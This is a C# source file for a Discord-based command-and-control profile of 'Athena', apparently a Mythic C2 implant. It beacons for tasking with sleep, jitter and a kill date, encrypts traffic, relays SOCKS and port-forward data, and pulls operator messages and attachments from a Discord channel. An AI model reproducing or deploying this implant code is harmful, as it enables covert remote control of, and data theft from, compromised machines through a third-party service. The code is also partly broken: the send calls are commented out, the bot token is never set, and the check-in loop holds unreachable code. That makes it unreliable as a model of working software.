using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Comms.SMB;
using Athena.Utilities;
using Discore;
using Discore.Http;
using Discore.WebSocket;
using System.Diagnostics;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using Athena.Models.Proxy;
using Athena.Profiles.Discord.Models;
using System.Text.Json.Serialization;

namespace Athena.Profiles.Discord
{
    public class Discord : IProfile
    {
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public string uuid { get; set; }
        public bool encrypted { get; set; }
        private string messageToken { get; set; }
        private int messageChecks { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        private bool encryptedExchangeCheck { get; set; }
        private HttpClient discordClient { get; set; }
        private string BotToken { get; set; }
        private string ChannelID { get; set; }
        private int timeBetweenChecks { get; set; }
        private string userAgent { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 5;
        private CancellationTokenSource cts = new CancellationTokenSource();
        private string agent_guid = Guid.NewGuid().ToString();
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
        private ManualResetEventSlim checkinResponse = new ManualResetEventSlim();
        private DiscordHttpClient _discordHttpClient { get; set; }
        private Shard _discordSocketClient { get; set; }
        private bool checkedIn { get; set; }

        public Discord()
        {
            this.uuid = "%UUID%";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.messageToken = "discord_token";
            this.ChannelID = "bot_channel";
            this.userAgent = "%USERAGENT%";
            this.messageChecks = int.Parse("message_checks");
            this.timeBetweenChecks = int.Parse("time_between_checks");
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "AESPSK";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            HttpClientHandler handler = new HttpClientHandler();

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    wp.Credentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }
            else
            {
                handler.UseDefaultCredentials = true;
                handler.Proxy = WebRequest.GetSystemWebProxy();
            }

            this.discordClient = new HttpClient(handler);
            this.discordClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", this.messageToken);

            if (!String.IsNullOrEmpty(this.userAgent))
            {
                this.discordClient.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            this._discordHttpClient = new DiscordHttpClient(this.BotToken);
            this._discordSocketClient = new Shard(this.BotToken, 0, 1);
            this._discordSocketClient.Gateway.OnMessageCreate += Gateway_OnMessageCreate;
        }

        async void Gateway_OnMessageCreate(object? sender, MessageCreateEventArgs e)
        {
            DiscordMessage message = e.Message;
            //e.Message.Attachments.Count

            MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(e.Message.Content);


            //Checks, is the message null, is the sender the same as the agent, is the message to the server
            //If any of these checks are true, then it's not meant for us.
            if (mythicMessage == null || mythicMessage.sender_id != this.agent_guid || mythicMessage.to_server)
            {
                return;
            }


            //If we get to here, it's a message for us.
            if(String.IsNullOrEmpty(mythicMessage.message)) //We have to get the attachment to get the content of the message
            {
                //Get embed content
                mythicMessage.message = await GetFileContentsAsync(message.Attachments[0].Url);
            }

        }

        public async Task<bool> Send(string json)
        {
            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                MythicMessageWrapper msg = new MythicMessageWrapper()
                {
                    message = json,
                    id = 0,
                    final = true,
                    sender_id = agent_guid,
                    to_server = true
                };

                string strMsg = JsonSerializer.Serialize(msg);
                if (strMsg.Length > 1950)
                {
                    //SendAttachment
                    //await SendAttachment(strMsg);
                }
                else
                {
                    //SendMessage
                    //await SendMessage(strMsg);
                }

                return true;

                //List<MythicMessageWrapper> agentMessages = new List<MythicMessageWrapper>();
                //List<string> msgToRemove = new List<string>();
                //int checkins = 0;
                //do
                //{
                //    await Task.Delay(this.timeBetweenChecks * 1000);

                //    var messages = await ReadMessages();
                //    foreach (var message in messages)
                //    {
                //        MythicMessageWrapper currentMessage;
                //        if (message.attachments.Count > 0)
                //        {
                //            foreach (var attachment in message.attachments)
                //            {
                //                if (attachment.filename.Contains(this.agent_guid) && !attachment.filename.EndsWith("server"))
                //                {
                //                    currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(await GetFileContentsAsync(attachment.url));
                //                    if (currentMessage is not null && currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                //                    {
                //                        agentMessages.Add(currentMessage);
                //                        msgToRemove.Add(message.id);
                //                    }
                //                }
                //            }
                //        }
                //        else
                //        {
                //            if (message.content.Contains(this.agent_guid))
                //            {
                //                currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.content);
                //                if (currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                //                {
                //                    agentMessages.Add(currentMessage);
                //                    msgToRemove.Add(message.id);
                //                }
                //            }
                //        }
                //    }
                //    checkins++;
                //    if (checkins == this.messageChecks)
                //    {
                //        return "";
                //    }

                //} while (agentMessages.Count() < 1);

                ////No concept of chunking yet, so just grab one
                //string strRes = agentMessages.FirstOrDefault().message;

                //DeleteMessages(msgToRemove);

                //if (this.encrypted)
                //{
                //    return this.crypt.Decrypt(strRes);
                //}
                //else
                //{
                //    if (String.IsNullOrEmpty(strRes))
                //    {
                //        return json;
                //    }
                //    else
                //    {
                //        return (await Misc.Base64Decode(strRes)).Substring(36);
                //    }
                //}
            }
            catch (Exception e)
            {
                return false;
            }
        }
        //public async Task<bool> SendMessage(string msg)
        //{
        //    string url = "https://discord.com/api/channels/" + this.ChannelID + "/messages";

        //    Dictionary<string, string> Payload = new Dictionary<string, string>()
        //    {
        //      {"content" , msg }
        //    };

        //    StringContent content = new StringContent(JsonSerializer.Serialize(Payload), Encoding.UTF8, "application/json");
        //    HttpResponseMessage res = await discordClient.PostAsync(url, content);

        //    return res.IsSuccessStatusCode ? true : false;
        //}

        //public async Task<List<ServerDetails>> ReadMessages()
        //{
        //    var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
        //    var res = await discordClient.GetAsync(url);
        //    string ResponseMessages = await res.Content.ReadAsStringAsync();
        //    return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>();
        //}

        //public async Task<bool> SendAttachment(string msg) //8mb by default, size limit applies to all files in a request 
        //{
        //    try
        //    {
        //        var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
        //        var Content = new MultipartFormDataContent();
        //        byte[] msgBytes = Encoding.ASCII.GetBytes(msg);

        //        var File_Content = new ByteArrayContent(msgBytes);
        //        File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
        //        File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
        //        {
        //            FileName = agent_guid + ".server",
        //        };
        //        Content.Add(File_Content);
        //        var res = await discordClient.PostAsync(URL, Content);

        //        return res.IsSuccessStatusCode;
        //    }
        //    catch (Exception e)
        //    {
        //        return false;
        //    }

        //}

        private async Task<string> GetFileContentsAsync(string url)
        {
            string message;
            HttpClient client = new HttpClient();

            using (HttpResponseMessage response = await client.GetAsync(url))
            {
                using (HttpContent content = response.Content)
                {
                    message = await content.ReadAsStringAsync();
                }

                if (response.IsSuccessStatusCode)
                {
                    return await Unescape(message);
                }
                return "";
            }
        }

        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
        public async Task<bool> DeleteMessages(List<string> messages)
        {
            bool success = false;
            foreach (var id in messages)
            {
                var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/messages/" + id;
                var res = await discordClient.DeleteAsync(url);
                success = res.IsSuccessStatusCode;
            }

            return success;
        }

        public async Task StartBeacon()
        {
            //Need to decide if I want to have a sleep in this or not
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);

                GetTasking gt = new GetTasking()
                {
                    action = "get_tasking",
                    tasking_size = -1,
                    delegates = delegateTask.Result,
                    socks = socksTask.Result,
                    responses = responseTask.Result,
                    rpfwd = rpFwdTask.Result,
                };
                try
                {
                    if(await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking)))
                    {
                        return;
                    }

                    this.currentAttempt++;

                    //if (String.IsNullOrEmpty(responseString))
                    //{
                    //    this.currentAttempt++;
                    //    continue;
                    //}

                    //GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    //if (gtr == null)
                    //{
                    //    this.currentAttempt++;
                    //    continue;
                    //}

                    //this.currentAttempt = 0;

                   
                    //TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    //this.(this, tra);
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Beacon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cts.Cancel();
                }
            }
            this._discordHttpClient.Dispose();
            this._discordSocketClient.Dispose();
            return;
        }

        public bool StopBeacon()
        {
            this.cts.Cancel();
            return true;
        }

        public async Task<bool> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;

            await this._discordSocketClient.StartAsync(GatewayIntent.GuildMessages | GatewayIntent.MessageContent);

            do
            {
                return await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                currentAttempt++;
            } while (currentAttempt <= maxAttempts);
        }
    }
}